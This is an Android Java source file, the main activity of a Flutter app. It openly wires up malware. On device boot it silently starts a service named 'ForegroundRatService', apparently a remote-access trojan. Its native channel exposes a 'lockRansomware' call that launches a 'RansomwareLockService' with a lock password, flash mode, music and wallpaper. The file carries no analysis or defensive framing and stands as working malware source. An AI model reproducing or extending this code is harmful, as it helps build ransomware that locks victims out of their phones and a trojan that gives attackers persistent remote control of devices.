package com.nullx.sta;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;

import androidx.annotation.NonNull;

import io.flutter.embedding.android.FlutterActivity;
import io.flutter.embedding.engine.FlutterEngine;
import io.flutter.plugin.common.MethodChannel;

public class MainActivity extends FlutterActivity {
    private static final String CHANNEL = "com.nullx.sta/native";
    private static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (getIntent().getBooleanExtra("from_boot", false)) {
            Log.d(TAG, "Starting from boot, launching ForegroundRatService...");
            Intent serviceIntent = new Intent(this, ForegroundRatService.class);
            startService(serviceIntent);
            new Handler().postDelayed(() -> {
                finish();
                Log.d(TAG, "MainActivity finished after boot start");
            }, 1000);
        }
    }

    @Override
    public void configureFlutterEngine(@NonNull FlutterEngine flutterEngine) {
        super.configureFlutterEngine(flutterEngine);
        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), CHANNEL)
                .setMethodCallHandler((call, result) -> {
                    switch (call.method) {
                        case "lockRansomware":
                            String name = call.argument("name");
                            String password = call.argument("password");
                            String flashMode = call.argument("flash");
                            String music = call.argument("music");
                            String wallpaper = call.argument("wallpaper");
                            lockRansomware(name, password, flashMode, music, wallpaper);
                            result.success("locked");
                            break;
                        case "stopLockService":
                            stopLockService();
                            result.success("done");
                            break;
                        case "startForeground":
                            Intent intent = new Intent(this, ForegroundRatService.class);
                            startService(intent);
                            result.success("started");
                            break;
                        default:
                            result.notImplemented();
                    }
                });
    }

    private void lockRansomware(String name, String password, String flashMode, String music, String wallpaper) {
        Intent intent = new Intent(this, RansomwareLockService.class);
        intent.putExtra("name", name);
        intent.putExtra("password", password);
        intent.putExtra("flash", flashMode);
        intent.putExtra("music", music);
        intent.putExtra("wallpaper", wallpaper);
        startService(intent);
    }

    private void stopLockService() {
        stopService(new Intent(this, RansomwareLockService.class));
    }
}